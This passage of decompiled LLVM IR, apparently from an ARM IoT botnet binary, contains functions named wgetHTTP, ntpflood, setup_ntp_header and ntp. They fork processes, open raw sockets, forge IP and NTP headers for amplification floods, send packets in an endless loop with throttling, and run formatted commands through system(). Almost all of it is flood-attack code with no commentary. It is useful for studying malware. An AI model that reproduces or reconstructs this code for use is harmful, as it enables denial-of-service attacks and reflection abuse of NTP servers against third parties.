dec_label_pc_100042f8:                            ; preds = %dec_label_pc_10004164, %dec_label_pc_100042f8
  %storemerge27 = phi i32 [ %v1_1000435c, %dec_label_pc_100042f8 ], [ 0, %dec_label_pc_10004164 ]
  %v1_10004300 = mul i32 %storemerge27, 28
  %v2_10004304 = add i32 %v1_10004300, %v1_100042d8
  %v2_1000430c = inttoptr i32 %v2_10004304 to i32*
  store i32 %storemerge27, i32* %v2_1000430c, align 4
  store i32 %v2_10004304, i32* %r9.global-to-local, align 4
  store i32 %v1_10004298, i32* %r11.global-to-local, align 4
  %v2_10004330 = add i32 %v2_10004304, 8
  %v3_10004330 = inttoptr i32 %v2_10004330 to i32*
  store i32 2, i32* %v3_10004330, align 4
  %v0_10004334 = load i32, i32* %r11.global-to-local, align 4
  %v1_10004334 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004334 = add i32 %v1_10004334, 12
  %v3_10004334 = inttoptr i32 %v2_10004334 to i32*
  store i32 %v0_10004334, i32* %v3_10004334, align 4
  %v0_10004338 = load i32, i32* %r10.global-to-local, align 4
  %v1_10004338 = load i32, i32* %r9.global-to-local, align 4
  %v2_10004338 = add i32 %v1_10004338, 16
  %v3_10004338 = inttoptr i32 %v2_10004338 to i32*
  store i32 %v0_10004338, i32* %v3_10004338, align 4
  %v1_1000433c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000433c = add i32 %v1_1000433c, 20
  %v3_1000433c = inttoptr i32 %v2_1000433c to i32*
  store i32 %tmp, i32* %v3_1000433c, align 4
  store i32 %v1_100042d8, i32* %r9.global-to-local, align 4
  %v3_10004354 = call i32 @sendVSE(i32 %v2_10004304, i32 %tmp, i32 %v1_100042d8)
  %v1_1000435c = add nuw nsw i32 %storemerge27, 1
  store i32 %v1_10004214, i32* %r9.global-to-local, align 4
  %v2_1000436c = icmp slt i32 %v1_1000435c, %v1_10004214
  br i1 %v2_1000436c, label %dec_label_pc_100042f8, label %dec_label_pc_10004374

dec_label_pc_10004374:                            ; preds = %dec_label_pc_100042f8, %dec_label_pc_10004164
  store i32 %v1_100041cc, i32* %r9.global-to-local, align 4
  %v2_1000437c = load i32, i32* %v1_100041d0, align 4
  store i32 %v1_100041ec, i32* %r9.global-to-local, align 4
  %v2_10004388 = load i32, i32* %v1_100041f0, align 4
  store i32 %v2_10004388, i32* %r11.global-to-local, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v7_100043a8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_1002a900.133 to i32), i32 %arg2, i32 %v2_1000437c)
  %v1_10004490 = add i32 %arg4, 24
  %v1_10004494 = inttoptr i32 %v1_10004490 to i32*
  br label %dec_label_pc_1000448c

dec_label_pc_100043b8:                            ; preds = %dec_label_pc_1000448c
  store i32 1000, i32* %r9.global-to-local, align 4
  store i32 268452816, i32* @lr, align 4
  %v1_100043cc = call i32 @usleep(i32 50000)
  %v3_100043d4 = load i32, i32* @global_var_1004518c.119, align 4
  %v2_100043dc = mul i32 %v3_100043d4, 20
  %v3_100043e4 = icmp ugt i32 %v2_100043dc, %v1_10004230
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_100043f0 = load i32, i32* @global_var_10045174.120, align 4
  br i1 %v3_100043e4, label %dec_label_pc_100043ec, label %dec_label_pc_1000442c

dec_label_pc_100043ec:                            ; preds = %dec_label_pc_100043b8
  %v2_100043f4 = icmp sgt i32 %v3_100043f0, 0
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %v2_100043f4, label %dec_label_pc_10004414, label %dec_label_pc_100043fc

dec_label_pc_100043fc:                            ; preds = %dec_label_pc_100043ec
  %v3_10004400 = load i32, i32* @global_var_100450b4.121, align 4
  %v1_10004404 = add i32 %v3_10004400, 100
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10004404, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10004474

dec_label_pc_10004414:                            ; preds = %dec_label_pc_100043ec
  %v1_1000441c = add i32 %v3_100043f0, -1
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_1000441c, i32* @global_var_10045174.120, align 4
  br label %dec_label_pc_10004474

dec_label_pc_1000442c:                            ; preds = %dec_label_pc_100043b8
  %v1_10004434 = add i32 %v3_100043f0, 1
  store i32 %v1_10004434, i32* @global_var_10045174.120, align 4
  %v3_10004444 = load i32, i32* @global_var_100450b4.121, align 4
  %tmp37 = icmp ult i32 %v3_10004444, 26
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %tmp37, label %dec_label_pc_10004468, label %dec_label_pc_10004450

dec_label_pc_10004450:                            ; preds = %dec_label_pc_1000442c
  %v1_10004458 = add i32 %v3_10004444, -25
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10004458, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10004474

dec_label_pc_10004468:                            ; preds = %dec_label_pc_1000442c
  store i32 0, i32* @global_var_100450b4.121, align 4
  br label %dec_label_pc_10004474

dec_label_pc_10004474:                            ; preds = %dec_label_pc_10004450, %dec_label_pc_10004414, %dec_label_pc_100043fc, %dec_label_pc_10004468
  store i32 0, i32* @global_var_1004518c.119, align 4
  store i32 %storemerge3, i32* %r9.global-to-local, align 4
  %v1_10004484 = add i32 %storemerge3, 1
  br label %dec_label_pc_1000448c

dec_label_pc_1000448c:                            ; preds = %dec_label_pc_10004374, %dec_label_pc_10004474
  %storemerge3 = phi i32 [ 0, %dec_label_pc_10004374 ], [ %v1_10004484, %dec_label_pc_10004474 ]
  store i32 %v1_10004490, i32* %r9.global-to-local, align 4
  %v2_10004494 = load i32, i32* %v1_10004494, align 4
  store i32 268453024, i32* @lr, align 4
  %v1_1000449c = call i32 @atol(i32 %v2_10004494)
  %v2_100044a8 = mul i32 %v1_1000449c, 20
  store i32 %v2_100044a8, i32* %r9.global-to-local, align 4
  %v3_100044b0 = icmp sgt i32 %v2_100044a8, %storemerge3
  br i1 %v3_100044b0, label %dec_label_pc_100043b8, label %dec_label_pc_100044b8

dec_label_pc_100044b8:                            ; preds = %dec_label_pc_1000448c
  %v0_100044bc = call i32 @__GI_exit()
  br label %dec_label_pc_100044c0

dec_label_pc_100044c0:                            ; preds = %entry, %dec_label_pc_10004134, %dec_label_pc_100044b8
  %v0_100044e4 = phi i32 [ %v1_100040cc, %entry ], [ %v0_10004144, %dec_label_pc_10004134 ], [ %v0_100044bc, %dec_label_pc_100044b8 ]
  %v2_100044c0 = load i32, i32* %stack_var_-2656, align 4
  store i32 %v5_1000409c, i32* %r9.global-to-local, align 4
  store i32 %v2_100044c0, i32* %r11.global-to-local, align 4
  ret i32 %v0_100044e4

; uselistorder directives
  uselistorder i32 %storemerge3, { 2, 0, 1 }
  uselistorder i32 %v3_100043f0, { 1, 0, 2 }
  uselistorder i32 %v1_10004490, { 1, 0 }
  uselistorder i32 %v1_1000435c, { 1, 0 }
  uselistorder i32 %v2_10004304, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge27, { 2, 1, 0 }
  uselistorder i32 %v1_100042d8, { 2, 1, 0 }
  uselistorder i32 %v1_10004214, { 3, 2, 0, 1, 4 }
  uselistorder i32* %stack_var_-2656, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 9, 17, 19, 10, 12, 11, 13, 14, 15, 16, 18, 20, 21, 22, 28, 23, 24, 25, 26, 27, 0, 29, 30, 31, 1, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100044c0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000448c, { 1, 0 }
  uselistorder label %dec_label_pc_10004474, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100042f8, { 1, 0 }
  uselistorder label %dec_label_pc_10004134, { 1, 0 }
  uselistorder label %dec_label_pc_10004108, { 1, 0 }
}

define i32 @wgetHTTP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-1064 = alloca i32, align 4
  %v1_10004514 = call i32 @mfork(i32 %arg2)
  %v3_1000451c = icmp eq i32 %v1_10004514, 0
  br i1 %v3_1000451c, label %dec_label_pc_10004524, label %dec_label_pc_100046f0

dec_label_pc_10004524:                            ; preds = %entry
  %v2_10004528 = icmp sgt i32 %arg3, 1
  br i1 %v2_10004528, label %dec_label_pc_10004550, label %dec_label_pc_10004530

dec_label_pc_10004530:                            ; preds = %dec_label_pc_10004524
  %v6_10004544 = call i32 @Send(i32 %arg1, i32 ptrtoint ([35 x i8]* @global_var_1002a920.135 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_1000454c = call i32 @__GI_exit()
  br label %dec_label_pc_10004550

dec_label_pc_10004550:                            ; preds = %dec_label_pc_10004524, %dec_label_pc_10004530
  %v1_10004554 = add i32 %arg4, 4
  %v1_10004558 = inttoptr i32 %v1_10004554 to i32*
  %v2_10004558 = load i32, i32* %v1_10004558, align 4
  %v1_10004564 = add i32 %arg4, 8
  %v1_10004568 = inttoptr i32 %v1_10004564 to i32*
  %v2_10004568 = load i32, i32* %v1_10004568, align 4
  store i32 268453236, i32* @lr, align 4
  %v1_10004570 = call i32 @atol(i32 %v2_10004568)
  store i32 268453252, i32* @lr, align 4
  %v1_10004580 = call i32 @__GI_time(i32 0)
  %v2_1000458c = add i32 %v1_10004580, %v1_10004570
  store i32 268453272, i32* @lr, align 4
  %v0_10004594 = call i32 @random()
  %v6_100045fc = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002a944.245 to i32), i32 %arg2, i32 %v2_10004558)
  store i32 268453592, i32* @lr, align 4
  %v1_100046d45 = call i32 @__GI_time(i32 0)
  %v2_100046e06 = icmp slt i32 %v1_100046d45, %v2_1000458c
  br i1 %v2_100046e06, label %dec_label_pc_10004604.lr.ph, label %dec_label_pc_100046e8

dec_label_pc_10004604.lr.ph:                      ; preds = %dec_label_pc_10004550
  %v2_1000467c = ptrtoint i32* %stack_var_-1064 to i32
  br label %dec_label_pc_10004604

dec_label_pc_10004604:                            ; preds = %dec_label_pc_10004604.lr.ph, %dec_label_pc_10004604
  store i32 268453384, i32* @lr, align 4
  %v0_10004604 = call i32 @random()
  %v2_10004620 = srem i32 %v0_10004604, 36
  %v1_10004644 = mul nsw i32 %v2_10004620, 4
  %v2_10004648 = add i32 %v1_10004644, ptrtoint ([255 x i8*]* @global_var_10040294.244 to i32)
  %v1_1000464c = inttoptr i32 %v2_10004648 to i32*
  %v2_1000464c = load i32, i32* %v1_1000464c, align 4
  store i32 %v2_1000464c, i32* @r3, align 4
  %v0_10004658 = call i32 @__GI_strlen()
  store i32 %v2_10004558, i32* @r3, align 4
  %v0_10004668 = call i32 @__GI_strlen()
  %v2_10004670 = add i32 %v0_10004658, %v0_10004668
  %v1_10004674 = mul i32 %v2_10004670, 4
  %v1_10004678 = add i32 %v1_10004674, 164
  store i32 %v2_1000467c, i32* @r3, align 4
  store i32 %v1_10004678, i32* @r4, align 4
  store i32 ptrtoint ([181 x i8]* @global_var_1002a964.247 to i32), i32* @r5, align 4
  store i32 268453572, i32* @lr, align 4
  %v9_100046c0 = call i32 @__GI_snprintf(i32 %v2_1000467c, i32 %v1_10004678, i32 ptrtoint ([181 x i8]* @global_var_1002a964.247 to i32), i32 %v2_1000464c, i32 %v2_10004558, i32 %v2_1000464c, i32 %v2_10004558, i32 %v2_10004558)
  store i32 ptrtoint ([3 x i8]* @global_var_100046d0.248 to i32), i32* @lr, align 4
  %v1_100046cc = call i32 @system(i32 %v2_1000467c)
  store i32 268453592, i32* @lr, align 4
  %v1_100046d4 = call i32 @__GI_time(i32 0)
  %v2_100046e0 = icmp slt i32 %v1_100046d4, %v2_1000458c
  br i1 %v2_100046e0, label %dec_label_pc_10004604, label %dec_label_pc_100046e8

dec_label_pc_100046e8:                            ; preds = %dec_label_pc_10004604, %dec_label_pc_10004550
  %v0_100046ec = call i32 @__GI_exit()
  br label %dec_label_pc_100046f0

dec_label_pc_100046f0:                            ; preds = %entry, %dec_label_pc_100046e8
  %v0_10004708 = phi i32 [ %v1_10004514, %entry ], [ %v0_100046ec, %dec_label_pc_100046e8 ]
  ret i32 %v0_10004708

; uselistorder directives
  uselistorder i32 %v1_10004678, { 1, 0 }
  uselistorder i32 %v2_1000467c, { 1, 0, 2 }
  uselistorder i32 %v2_1000458c, { 1, 0 }
  uselistorder i32 268453592, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100046f0, { 1, 0 }
  uselistorder label %dec_label_pc_10004604, { 1, 0 }
  uselistorder label %dec_label_pc_10004550, { 1, 0 }
}

define i32 @setup_ntp_header(i16* %arg1) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000470c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000470c, i32* %stack_var_-32, align 4
  store i32 5678, i32* @r3, align 4
  %v1_10004728 = call i32 @htons(i32 5678)
  %sext = mul i32 %v1_10004728, 65536
  %v1_1000472c = sdiv i32 %sext, 65536
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v1_10004734 = trunc i32 %v1_1000472c to i16
  store i16 %v1_10004734, i16* %arg1, align 2
  store i32 123, i32* @r3, align 4
  %v1_1000473c = call i32 @htons(i32 123)
  %v1_10004748 = trunc i32 %v1_1000473c to i16
  %v3_10004748 = add i32 %tmp, 2
  %v4_10004748 = inttoptr i32 %v3_10004748 to i16*
  store i16 %v1_10004748, i16* %v4_10004748, align 2
  %v3_10004754 = add i32 %tmp, 6
  %v4_10004754 = inttoptr i32 %v3_10004754 to i16*
  store i16 0, i16* %v4_10004754, align 2
  %v1_1000475c = add i32 %tmp, 8
  store i32 %v1_1000475c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10004770 = inttoptr i32 %v1_1000475c to i32*
  store i32 385876778, i32* %v2_10004770, align 4
  %v0_10004774 = load i32, i32* %r9.global-to-local, align 4
  %v1_10004774 = load i32, i32* %r11.global-to-local, align 4
  %v2_10004774 = add i32 %v1_10004774, 4
  %v3_10004774 = inttoptr i32 %v2_10004774 to i32*
  store i32 %v0_10004774, i32* %v3_10004774, align 4
  store i32 16, i32* @r3, align 4
  %v1_1000477c = call i32 @htons(i32 16)
  %v2_1000477c = trunc i32 %v1_1000477c to i16
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v3_10004788 = add i32 %tmp, 4
  %v4_10004788 = inttoptr i32 %v3_10004788 to i16*
  store i16 %v2_1000477c, i16* %v4_10004788, align 2
  %v2_1000478c = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_1000478c, i32* %r11.global-to-local, align 4
  ret i32 %v1_1000477c

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3, 4, 5 }
}

define i32 @ntpflood(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %v2_100047c4 = ptrtoint i32* %stack_var_-4144 to i32
  %v1_100047d0 = add i32 %v2_100047c4, 20
  %v5_100047d4 = inttoptr i32 %v1_100047d0 to i16*
  %v1_100047e0 = add i32 %arg1, 12
  %v2_100047e0 = inttoptr i32 %v1_100047e0 to i32*
  %v3_100047e0 = load i32, i32* %v2_100047e0, align 4
  %v1_10004800 = add i32 %arg1, 4
  %v2_10004800 = inttoptr i32 %v1_10004800 to i32*
  %v3_10004800 = load i32, i32* %v2_10004800, align 4
  store i32 268453912, i32* @lr, align 4
  %v3_10004814 = call i32 @socket(i32 2, i32 3, i32 6)
  %tmp26 = icmp sgt i32 %v3_10004814, -1
  br i1 %tmp26, label %dec_label_pc_10004834, label %dec_label_pc_1000482c

dec_label_pc_1000482c:                            ; preds = %entry
  %v0_10004830 = call i32 @__GI_exit()
  br label %dec_label_pc_10004834

dec_label_pc_10004834:                            ; preds = %entry, %dec_label_pc_1000482c
  store i32 268453948, i32* @lr, align 4
  %v1_10004838 = call i32 @__GI_time(i32 0)
  %v1_10004844 = call i32 @init_rand(i32 %v1_10004838)
  store i32 %v2_100047c4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268453984, i32* @lr, align 4
  %v0_1000485c = call i32 @__GI_memset()
  store i32 268453992, i32* @lr, align 4
  %v2_10004864 = call i32 @setup_ip_header(i32* nonnull %stack_var_-4144)
  store i32 268454000, i32* @lr, align 4
  %v2_1000486c = call i32 @setup_ntp_header(i16* %v5_100047d4)
  store i32 268454004, i32* @lr, align 4
  %v0_10004870 = call i32 @random()
  %v2_10004890 = srem i32 %v0_10004870, 64509
  %fold = add nsw i32 %v2_10004890, 1026
  %v1_100048bc = urem i32 %fold, 65536
  store i32 %v1_100048bc, i32* @r3, align 4
  %v1_100048c4 = call i32 @htons(i32 %v1_100048bc)
  %v1_100048d0 = trunc i32 %v1_100048c4 to i16
  store i16 %v1_100048d0, i16* %v5_100047d4, align 4
  %v2_100048dc = add i32 %v2_100047c4, 12
  %v3_100048dc = inttoptr i32 %v2_100048dc to i32*
  store i32 %v3_100047e0, i32* %v3_100048dc, align 4
  %v1_100048e4 = add i32 %v3_10004800, 4
  %v2_100048e4 = inttoptr i32 %v1_100048e4 to i32*
  %v3_100048e4 = load i32, i32* %v2_100048e4, align 4
  %v2_100048ec = add i32 %v2_100047c4, 16
  %v3_100048ec = inttoptr i32 %v2_100048ec to i32*
  store i32 %v3_100048e4, i32* %v3_100048ec, align 4
  %v1_100048f8 = or i32 %v2_100047c4, 2
  %v2_100048f8 = inttoptr i32 %v1_100048f8 to i16*
  %v3_100048f8 = load i16, i16* %v2_100048f8, align 2
  %div = udiv i16 %v3_100048f8, 2
  %v1_10004900 = zext i16 %div to i32
  %v2_10004910 = bitcast i32* %stack_var_-4144 to i16*
  %v3_10004910 = call i32 @csum(i16* %v2_10004910, i32 %v1_10004900)
  %v1_1000491c = trunc i32 %v3_10004910 to i16
  %v3_1000491c = add i32 %v2_100047c4, 10
  %v4_1000491c = inttoptr i32 %v3_1000491c to i16*
  store i16 %v1_1000491c, i16* %v4_1000491c, align 2
  store i32 1, i32* %stack_var_-32, align 4
  %v2_10004928 = ptrtoint i32* %stack_var_-32 to i32
  store i32 268454216, i32* @lr, align 4
  %v5_10004944 = call i32 @__GI_setsockopt(i32 %v3_10004814, i32 0, i32 3, i32 %v2_10004928, i32 4)
  %tmp28 = icmp sgt i32 %v5_10004944, -1
  br i1 %tmp28, label %dec_label_pc_1000495c, label %dec_label_pc_10004954

dec_label_pc_10004954:                            ; preds = %dec_label_pc_10004834
  %v0_10004958 = call i32 @__GI_exit()
  br label %dec_label_pc_1000495c

dec_label_pc_1000495c:                            ; preds = %dec_label_pc_10004834, %dec_label_pc_10004954
  store i32 268454244, i32* @lr, align 4
  %v1_10004960 = call i32 @__GI_time(i32 0)
  %v1_1000496c = call i32 @init_rand(i32 %v1_10004960)
  %v3_100049e8 = add i32 %v2_100047c4, 4
  %v4_100049e8 = inttoptr i32 %v3_100049e8 to i16*
  br label %dec_label_pc_10004978

dec_label_pc_10004978:                            ; preds = %dec_label_pc_10004a5c, %dec_label_pc_1000495c
  %stack_var_-4160.0 = phi i32 [ %v3_10004800, %dec_label_pc_1000495c ], [ %v3_100049b4, %dec_label_pc_10004a5c ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_1000495c ], [ %v1_10004a60, %dec_label_pc_10004a5c ]
  %v3_1000497c = load i16, i16* %v2_100048f8, align 2
  %v4_1000497c = zext i16 %v3_1000497c to i32
  store i32 268454320, i32* @lr, align 4
  %v6_100049ac = call i32 @sendto(i32 %v3_10004814, i32 %v2_100047c4, i32 %v4_1000497c, i32 0, i32 %stack_var_-4160.0, i32 16)
  %v1_100049b4 = add i32 %stack_var_-4160.0, 532
  %v2_100049b4 = inttoptr i32 %v1_100049b4 to i32*
  %v3_100049b4 = load i32, i32* %v2_100049b4, align 4
  %v1_100049c0 = add i32 %v3_100049b4, 4
  %v2_100049c0 = inttoptr i32 %v1_100049c0 to i32*
  %v3_100049c0 = load i32, i32* %v2_100049c0, align 4
  store i32 %v3_100049c0, i32* %v3_100048ec, align 4
  %v0_100049cc = call i32 @rand_cmwc()
  store i32 %v0_100049cc, i32* @r3, align 4
  %v1_100049d8 = call i32 @htonl(i32 %v0_100049cc)
  %v1_100049e8 = trunc i32 %v1_100049d8 to i16
  store i16 %v1_100049e8, i16* %v4_100049e8, align 4
  %v3_100049f4 = load i16, i16* %v2_100048f8, align 2
  %div29 = udiv i16 %v3_100049f4, 2
  %v1_100049fc = zext i16 %div29 to i32
  %v3_10004a0c = call i32 @csum(i16* %v2_10004910, i32 %v1_100049fc)
  %v1_10004a18 = trunc i32 %v3_10004a0c to i16
  store i16 %v1_10004a18, i16* %v4_1000491c, align 2
  %v3_10004a20 = load i32, i32* @global_var_1004518c.119, align 4
  %v1_10004a24 = add i32 %v3_10004a20, 1
  store i32 %v1_10004a24, i32* @global_var_1004518c.119, align 4
  %v3_10004a34 = load i32, i32* @global_var_10045174.120, align 4
  %v3_10004a3c = icmp ugt i32 %v3_10004a34, %storemerge4
  br i1 %v3_10004a3c, label %dec_label_pc_10004a5c, label %dec_label_pc_10004a44

dec_label_pc_10004a44:                            ; preds = %dec_label_pc_10004978
  %v3_10004a50 = load i32, i32* @global_var_100450b4.121, align 4
  store i32 268454492, i32* @lr, align 4
  %v1_10004a58 = call i32 @usleep(i32 %v3_10004a50)
  br label %dec_label_pc_10004a5c

dec_label_pc_10004a5c:                            ; preds = %dec_label_pc_10004978, %dec_label_pc_10004a44
  %stack_var_-20.0 = phi i32 [ %storemerge4, %dec_label_pc_10004978 ], [ 0, %dec_label_pc_10004a44 ]
  %v1_10004a60 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_10004978

; uselistorder directives
  uselistorder i32 %v3_100049b4, { 1, 0 }
  uselistorder i32 %stack_var_-4160.0, { 1, 0 }
  uselistorder i32 %v1_100048bc, { 1, 0 }
  uselistorder i32 %v2_100047c4, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder i32* %stack_var_-4144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32 (i32*)* @setup_ip_header, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004a5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000495c, { 1, 0 }
  uselistorder label %dec_label_pc_10004834, { 1, 0 }
}

define i32 @ntp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1080 = alloca i32, align 4
  %stack_var_-1136 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10004a6c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10004a6c, i32* %stack_var_-1136, align 4
  %v5_10004a6c = ptrtoint i32* %stack_var_-1136 to i32
  %v1_10004aa4 = call i32 @mfork(i32 %arg2)
  %v3_10004aac = icmp eq i32 %v1_10004aa4, 0
  br i1 %v3_10004aac, label %dec_label_pc_10004ab4, label %dec_label_pc_100050a4

dec_label_pc_10004ab4:                            ; preds = %entry
  store i32 268454596, i32* @lr, align 4
  %v3_10004ac0 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp37 = icmp sgt i32 %v3_10004ac0, -1
  br i1 %tmp37, label %dec_label_pc_10004ae0, label %dec_label_pc_10004ad8

dec_label_pc_10004ad8:                            ; preds = %dec_label_pc_10004ab4
  %v0_10004adc = call i32 @__GI_exit()
  br label %dec_label_pc_10004ae0

dec_label_pc_10004ae0:                            ; preds = %dec_label_pc_10004ab4, %dec_label_pc_10004ad8
  %v2_10004ae4 = icmp sgt i32 %arg3, 5
  br i1 %v2_10004ae4, label %dec_label_pc_10004b0c, label %dec_label_pc_10004aec

dec_label_pc_10004aec:                            ; preds = %dec_label_pc_10004ae0
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10004b00 = call i32 @Send(i32 %arg1, i32 ptrtoint ([112 x i8]* @global_var_1002aa28.254 to i32), i32 %arg2, i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32))
  %v0_10004b08 = call i32 @__GI_exit()
  br label %dec_label_pc_10004b0c

dec_label_pc_10004b0c:                            ; preds = %dec_label_pc_10004ae0, %dec_label_pc_10004aec
  %v1_10004b10 = add i32 %arg4, 12
  store i32 %v1_10004b10, i32* %r9.global-to-local, align 4
  %v1_10004b14 = inttoptr i32 %v1_10004b10 to i32*
  %v2_10004b14 = load i32, i32* %v1_10004b14, align 4
  store i32 %v2_10004b14, i32* @r3, align 4
  %v0_10004b1c = call i32 @__GI_strlen()
  %v1_10004b24 = mul i32 %v0_10004b1c, 5
  store i32 %v1_10004b24, i32* %r9.global-to-local, align 4
  %v1_10004b28 = add i32 %v1_10004b24, 160
  %v2_10004b34 = icmp sgt i32 %v1_10004b28, 1023
  br i1 %v2_10004b34, label %dec_label_pc_100050a4, label %dec_label_pc_10004b3c

dec_label_pc_10004b3c:                            ; preds = %dec_label_pc_10004b0c
  store i32 %v1_10004b28, i32* %r10.global-to-local, align 4
  store i32 %v1_10004b10, i32* %r9.global-to-local, align 4
  %v2_10004b48 = load i32, i32* %v1_10004b14, align 4
  store i32 %v1_10004b10, i32* %r9.global-to-local, align 4
  %v2_10004b54 = load i32, i32* %v1_10004b14, align 4
  store i32 %v1_10004b10, i32* %r9.global-to-local, align 4
  %v2_10004b60 = load i32, i32* %v1_10004b14, align 4
  store i32 %v1_10004b10, i32* %r9.global-to-local, align 4
  %v2_10004b6c = load i32, i32* %v1_10004b14, align 4
  store i32 %v1_10004b10, i32* %r9.global-to-local, align 4
  %v2_10004b78 = load i32, i32* %v1_10004b14, align 4
  store i32 %v2_10004b78, i32* %r11.global-to-local, align 4
  %v2_10004b7c = ptrtoint i32* %stack_var_-1080 to i32
  store i32 %v2_10004b7c, i32* @r3, align 4
  store i32 %v1_10004b28, i32* @r4, align 4
  store i32 ptrtoint ([171 x i8]* @global_var_1002aa98.256 to i32), i32* @r5, align 4
  store i32 %v2_10004b6c, i32* %r9.global-to-local, align 4
  store i32 %v2_10004b78, i32* %r10.global-to-local, align 4
  store i32 268454824, i32* @lr, align 4
  %v9_10004ba4 = call i32 @__GI_snprintf(i32 %v2_10004b7c, i32 %v1_10004b28, i32 ptrtoint ([171 x i8]* @global_var_1002aa98.256 to i32), i32 %v2_10004b48, i32 %v2_10004b54, i32 %v2_10004b60, i32 %v2_10004b6c, i32 %v1_10004b28)
  store i32 ptrtoint ([3 x i8]* @global_var_10004bb4.257 to i32), i32* @lr, align 4
  %v1_10004bb0 = call i32 @system(i32 %v2_10004b7c)
  store i32 268454844, i32* @lr, align 4
  %v1_10004bb8 = call i32 @__GI_time(i32 0)
  store i32 ptrtoint (i32* @global_var_10004bc8.258 to i32), i32* @lr, align 4
  %v1_10004bc4 = call i32 @srand(i32 %v1_10004bb8)
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_10045194.105, align 4
  store i32 128, i32* @r3, align 4
  store i32 268454896, i32* @lr, align 4
  %v0_10004bec = call i32 @malloc()
  store i32 128, i32* %r9.global-to-local, align 4
  store i32 %v0_10004bec, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  store i32 268454928, i32* @lr, align 4
  %v0_10004c0c = call i32 @__GI_memset()
  %v1_10004c1c = add i32 %arg4, 16
  store i32 %v1_10004c1c, i32* %r9.global-to-local, align 4
  %v1_10004c20 = inttoptr i32 %v1_10004c1c to i32*
  %v2_10004c20 = load i32, i32* %v1_10004c20, align 4
  store i32 268454956, i32* @lr, align 4
  %v1_10004c28 = call i32 @atol(i32 %v2_10004c20)
  %v1_10004c38 = add i32 %arg4, 20
  store i32 %v1_10004c38, i32* %r9.global-to-local, align 4
  %v1_10004c3c = inttoptr i32 %v1_10004c38 to i32*
  %v2_10004c3c = load i32, i32* %v1_10004c3c, align 4
  store i32 268454984, i32* @lr, align 4
  %v1_10004c44 = call i32 @atol(i32 %v2_10004c3c)
  store i32 0, i32* @global_var_10045174.120, align 4
  store i32 0, i32* @global_var_1004518c.119, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 268455044, i32* @lr, align 4
  %v3_10004c80 = call i32 @__GI_fopen(i32 ptrtoint ([8 x i8]* @global_var_1002ab44.259 to i32), i32 ptrtoint ([2 x i8]* @global_var_1002a6e0.110 to i32))
  %v2_10004ca4 = add i32 %v0_10004c0c, -1
  br label %dec_label_pc_10004e1c.outer

dec_label_pc_10004c90:                            ; preds = %dec_label_pc_10004e1c
  store i32 %v0_10004c0c, i32* @r3, align 4
  %v0_10004c94 = call i32 @__GI_strlen()
  %v1_10004ca8 = add i32 %v0_10004c94, %v2_10004ca4
  store i32 %v1_10004ca8, i32* %r9.global-to-local, align 4
  %v1_10004cac = inttoptr i32 %v1_10004ca8 to i8*
